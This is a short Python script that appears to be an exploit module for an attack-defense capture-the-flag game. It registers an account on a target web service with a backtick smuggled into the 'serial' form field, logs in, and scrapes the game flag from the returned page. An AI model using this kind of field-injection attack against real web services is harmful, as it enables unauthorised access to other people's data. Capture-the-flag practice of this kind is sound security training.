
import socket, httplib, urllib
 
class Exploit():
 
	def __init__(self):
		self.flag = ""
	 
	def execute(self, ip, port, flag_id):
		params = urllib.urlencode({'username': flag_id, 'password': 'z', 'serial': '`'})
		lparams = urllib.urlencode({'username': flag_id, 'password': 'z'})
		headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
		connl = httplib.HTTPConnection(ip, port)
		connl.request("POST", "/register", params, headers)
		connl.getresponse().read()
		connl.request("POST", "/login", lparams, headers)
		cookie = connl.getresponse().getheaders()[1][1]
		headers["Cookie"] = cookie
		connl.request("GET", "/", "", headers)
		exploit = connl.getresponse().read().split('[')[1].split(']')[0].split(':')[1].strip()
 
		self.flag = exploit
 
	def result(self):
		return {'FLAG': self.flag}
